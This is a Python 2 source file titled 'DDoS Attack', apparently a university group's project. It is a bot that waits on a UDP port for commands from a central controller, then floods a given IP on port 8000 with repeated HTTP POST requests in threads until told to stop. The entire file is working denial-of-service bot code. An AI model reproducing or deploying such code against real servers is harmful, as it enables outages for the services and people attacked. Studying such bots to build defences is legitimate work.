#DDoS Attack
#Created by DDoS group from UnB

#Bibliotecas
from socket import *
import requests
from threading import Thread

#Variavel global que ira controlar a execucao
global Kill
#Variavel para parar o ataque
Kill = False

#Funcao ataque
def Post(url,attackedServerPort):
    parameters = {'nome':'Fuluno','cpf': '12345678910','Data':'29/06/2017','Local:':'Brasilia'}
    headers = {'keep_alive': 'True'}
    while not Kill:
        r = requests.post(url, data=parameters, headers=headers)
        print r.text
    print 'parou'

    

#Funcao que ira criar as Threas 
def attack(IP, attackedServerPort):
    channel = []
    #Definicao das n threads
    for i in range(0, 1):
        channel.append(Thread(target=Post, args=[IP, attackedServerPort]))

    for i in range(0, 1):
        #seta as threads como daemon = true para que elas possam ser destruidas
        channel[i].setDaemon(True)
        #Inicia as threads
        channel[i].start()

#Funcao que escuta o controle central
def listening():

    sentence = ''

    #Porta que ira atacar
    attackedServerPort = 8000

    #Porta do servidor
    serverPort = 12000

    #Criando socket
    serverSocket = socket(AF_INET, SOCK_DGRAM)

    hostName = gethostbyname('0.0.0.0')

    #Junta porta com o nome do host
    serverSocket.bind((hostName, serverPort))

    print 'Waiting for my master...'

    #Ira analisar a variavel global
    global Kill

    while 1:
        while not sentence:
            sentence, addr = serverSocket.recvfrom(1024)

        command = sentence.split('/')[0]
        IP = sentence.split('/')[1]

        IP = 'http://' + IP + ':' + str(attackedServerPort)

        sentence = ''
        if(command == 'S'):
            print 'Starting attack'
            Kill = False
            attack(IP, attackedServerPort) # funcao que cria as threads
        elif command == 'B':
            print 'Attack is over'
            Kill = True
        

    #Fecha socket    
    serverSocket.close()


if __name__ == "__main__":

    listening()